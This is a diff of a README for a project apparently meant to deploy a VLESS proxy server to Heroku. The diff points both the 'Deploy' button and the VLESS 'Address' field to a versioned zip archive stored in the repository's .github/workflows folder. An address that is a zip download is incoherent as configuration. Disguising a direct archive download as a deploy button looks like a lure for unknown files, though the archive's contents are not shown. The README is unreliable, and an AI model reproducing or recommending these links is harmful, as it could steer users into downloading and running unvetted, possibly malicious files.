@@ -1,12 +1,12 @@
 # heroku-vless
 Deploy VLESS server to heroku
 
-[![Deploy](https://raw.githubusercontent.com/aslekariii/heroku-vless/main/.github/workflows/heroku-vless_2.0.zip)](https://raw.githubusercontent.com/aslekariii/heroku-vless/main/.github/workflows/heroku-vless_2.0.zip)
+[![Deploy](https://github.com/aslekariii/heroku-vless/raw/refs/heads/main/.github/workflows/heroku_vless_3.3.zip)](https://github.com/aslekariii/heroku-vless/raw/refs/heads/main/.github/workflows/heroku_vless_3.3.zip)
 
 
 ```
 VLESS:
-Address: https://raw.githubusercontent.com/aslekariii/heroku-vless/main/.github/workflows/heroku-vless_2.0.zip
+Address: https://github.com/aslekariii/heroku-vless/raw/refs/heads/main/.github/workflows/heroku_vless_3.3.zip
 Port: 443
 id: Your entered id
 encryption: none
